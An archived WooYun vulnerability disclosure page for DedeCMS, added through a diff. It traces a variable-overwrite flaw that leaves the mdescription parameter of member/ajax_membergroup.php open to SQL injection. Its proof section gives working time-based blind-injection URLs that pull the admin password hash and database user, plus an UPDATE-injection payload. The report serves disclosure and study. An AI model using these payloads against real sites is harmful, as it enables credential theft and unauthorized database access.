@@ -1,0 +1,277 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		dedecms SQL盲注漏洞（已经确定可以直接update出密码）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		dedecms SQL盲注漏洞（已经确定可以直接update出密码）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/胸大无脑">胸大无脑</a> 
+</li><li>提交时间：		2013-11-22 12:11</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-27：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-02-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">某处盲注，获取任意数据</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞处在ROOT_PATH/member/ajax_membergroup.php的53、54行<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2200110518defc0e36d7c81e0343532e6a1fe88b.png" target="_blank"><img src="../images/2200110518defc0e36d7c81e0343532e6a1fe88b.png" alt="daima1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+$mdescription变量是可控的，并且没有任何过滤，为什么？接下里继续看<br />
+<br />
+再看第一行<br />
+<br />
+</p><p class="detail"><a href="../images/22001328335e4ab4408bfb5a56ca8d59b80bc839.png" target="_blank"><img src="../images/22001328335e4ab4408bfb5a56ca8d59b80bc839.png" alt="reuire_config.png" width="600"/></a></p><p class="detail"><br />
+<br />
+包含了ROOT_PATH/member/config.php<br />
+<br />
+然后跟着<br />
+<br />
+ROOT_PATH/member/config.php<br />
+<br />
+</p><p class="detail"><a href="../images/220017070ae6c2742c5a4a9c2d3604bbba1c9b3b.png" target="_blank"><img src="../images/220017070ae6c2742c5a4a9c2d3604bbba1c9b3b.png" alt="config.php.png" width="600"/></a></p><p class="detail"><br />
+<br />
+第10行，包含了ROOT_PATH/include/filter.inc.php<br />
+<br />
+<br />
+<br />
+接着来到filter.inc.php<br />
+<br />
+</p><p class="detail"><a href="../images/22001918da84e5e42e6e98ad9cbe1e1da4d53d83.png" target="_blank"><img src="../images/22001918da84e5e42e6e98ad9cbe1e1da4d53d83.png" alt="filter.png" width="600"/></a></p><p class="detail"><br />
+<br />
+首先这里有个典型的变量覆盖，并且会遍历里面对其进行过滤<br />
+<br />
+来看看过滤函数<br />
+<br />
+</p><p class="detail"><a href="../images/2200245569323b6b27930470ef2d99d87fbdac57.png" target="_blank"><img src="../images/2200245569323b6b27930470ef2d99d87fbdac57.png" alt="filter_all.png" width="600"/></a></p><p class="detail"><br />
+<br />
+$cfg_notallowstr是什么<br />
+<br />
+<br />
+<br />
+来看看<br />
+<br />
+</p><p class="detail"><a href="../images/22002957a53e907ad563c31888991539f008c174.png" target="_blank"><img src="../images/22002957a53e907ad563c31888991539f008c174.png" alt="config.php.png" width="600"/></a></p><p class="detail"><br />
+<br />
+为空<br />
+<br />
+<br />
+<br />
+那么这是干什么的，这个函数是用来过滤敏感词的，比如各种和谐。<br />
+<br />
+<br />
+<br />
+意思就是在filter.inc.php里面发生了变量覆盖并且没有任何过滤。<br />
+<br />
+然后ROOT_PATH/member/config.php包含了filter.inc.php。<br />
+<br />
+ROOT_PATH/member/ajax_membergroup.php又去包含了ROOT_PATH/member/config.php<br />
+<br />
+通过覆盖$mdescription<br />
+<br />
+我们可以任意控制sql语句 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">首先要能注册<br />
+<br />
+EXP<br />
+<br />
+</p><pre><code>http://127.0.0.1/dede/member/ajax_membergroup.php?action=desshow&amp;mid=1&amp;action=despost&amp;mdescription=asd&#039;  where id=@`&#039;` or(select if(substring((select pwd from dede_admin),1,1)=&#039;f&#039;,sleep(5),0)) -- - @`&#039;`</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://127.0.0.1/dede/member/ajax_membergroup.php?action=desshow&amp;mid=1&amp;action=despost&amp;mdescription=asd&#039;  where id=@`&#039;` or(select if(substring((select 1),1,1)=&#039;1&#039;,sleep(5),0)) -- - @`&#039;`</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://127.0.0.1/dede/member/ajax_membergroup.php?action=desshow&amp;mid=1&amp;action=despost&amp;mdescription=asd&#039;  where id=@`&#039;` or(select if(substring((select user()),1,1)=&#039;r&#039;,sleep(5),0)) -- - @`&#039;`</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/22004046aa83068630410f0b793dfcddf1ac9dbb.png" target="_blank"><img src="../images/22004046aa83068630410f0b793dfcddf1ac9dbb.png" alt="QQ截图20131121234622.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/2200415867937bc8d4f603743f178aa4923b93a5.png" target="_blank"><img src="../images/2200415867937bc8d4f603743f178aa4923b93a5.png" alt="QQ截图20131121234919.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/220041020867dc2f3f7988a5f116411810ba448f.png" target="_blank"><img src="../images/220041020867dc2f3f7988a5f116411810ba448f.png" alt="QQ截图20131121234908.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://127.0.0.1/dede/member/ajax_membergroup.php?action=desshow&amp;mid=1&amp;action=despost&amp;mdescription=asd&#039;  where id=@`&#039;` or(select if(substring((select pwd from dede_admin),1,1)=&#039;f&#039;,sleep(5),0)) -- - @`&#039;`</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/22003827bdae3008cef8aed5e0e3cbf52f2270ff.png" target="_blank"><img src="../images/22003827bdae3008cef8aed5e0e3cbf52f2270ff.png" alt="admin.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>view-source:http://localhost/test/dedecms/member/ajax_membergroup.php?action=desshow&amp;mid=1&amp;action=despost&amp;mdescription=&#039;,funame=char(@`&#039;`),description=(select%20user()),funame=&#039;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>最终成  UPDATE `dede_member_friends` SET `description`=&#039;&#039;,funame=char(@`&#039;`),description=(select user()),funame=&#039;&#039; WHERE `fid`=&#039;1&#039; AND `mid`=&#039;1&#039;   绕过checksql执行了</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">filter.inc.php里面做过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/胸大无脑" title="胸大无脑">胸大无脑</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043674" title="dedecms SQL盲注漏洞（已经确定可以直接update出密码）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-27 12:11</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：15 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43674";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
